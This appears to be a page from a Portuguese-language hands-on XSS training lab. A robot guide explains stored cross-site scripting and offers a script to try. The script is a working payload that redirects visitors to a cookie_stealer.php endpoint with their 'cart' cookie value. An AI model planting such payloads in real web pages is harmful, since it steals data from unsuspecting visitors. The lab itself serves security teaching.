...
<div style="display: flex; width: 100%;">
    ...
    <div class="content" style="margin: 0px">
            ...
            <img src="../img/tutorial/intermediario-armazenado2-pagina2.png" alt="">
            </div>
    
    <div class ="container-robot" style="transform: translate(32vw, -8vw) scale(1);">
        <div class="robot-speech">
            <p class="writer" id="balloon-text">
            Explorando o XSS Armazenado, podemos observar que todo usuário que acessar a esta página será acometido pelo ataque. Agora, explore este script e veja a execução!
            </p>
        </div>
        ...
        <div id="codeBlock">
        <code>
        &lt;script&gt;window.location="./cookie_stealer.php?atividade=arm_cookie&amp;cart=" + encodeURIComponent(document.cookie.split("; ").find(row =&gt; row.startsWith("cart="))?.split("=")[1]);&lt;/script&gt;
        </code>
        </div>
        ...
        <a href="./lab2-armazenado1.php"  style="color: white; text-decoration: none; z-index:100;">
...
<script>
transformRobotForMenuState(-6, 1);
</script>
</body>
</html>
